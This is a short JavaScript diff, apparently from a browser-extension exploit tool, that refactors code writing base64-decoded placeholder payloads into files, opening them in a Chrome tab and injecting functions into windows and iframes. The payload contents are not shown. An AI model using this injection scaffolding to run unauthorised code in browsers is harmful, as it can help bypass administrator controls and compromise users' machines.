@@ -89,7 +89,7 @@ function payload() {
         }
         
         await Promise.all([writeFile(fs, 'dreamland.js', `${atob("%%DREAMLANDJS%%")}`),
-        writeFile(fs, 'index.js', `(async function () {${atob("%%CHROMEPAYLOAD%%")}})()`)]);
+        writeFile(fs, 'index.js', `async function run() {\n${atob("%%CHROMEPAYLOAD%%")}\n}\nrun()`)]);
         const url = await writeFile(fs, 'index.html', `<!Doctype html><html><head><script src="./dreamland.js"></script><script defer src="./index.js"></script></head><body></body></html>`);
         w.chrome.tabs.create({ url });
         w.close();
@@ -121,14 +121,14 @@ document.getElementById("evalPayloadExt").addEventListener("click", function () 
             w.onload = function () {(${injected.toString()})(w, data.data)}
         };`
     );
-    const ifr = document.createElement("iframe");
-    ifr.src = URL_1;
+    const iframe = document.createElement("iframe");
+    iframe.src = URL_1;
 
-    const ifrid = globalMap.push(ifr) - 1;
-    document.body.appendChild(ifr);
-    ifr.idx = ifrid;
-    ifr.onload = function () {
-        ifr.contentWindow.postMessage({
+    const ifrid = globalMap.push(iframe) - 1;
+    document.body.appendChild(iframe);
+    iframe.idx = ifrid;
+    iframe.onload = function () {
+        iframe.contentWindow.postMessage({
             type: "uidpass",
             passcode: ifrid,
             cleanup: false // TODO: ADD cleanup option
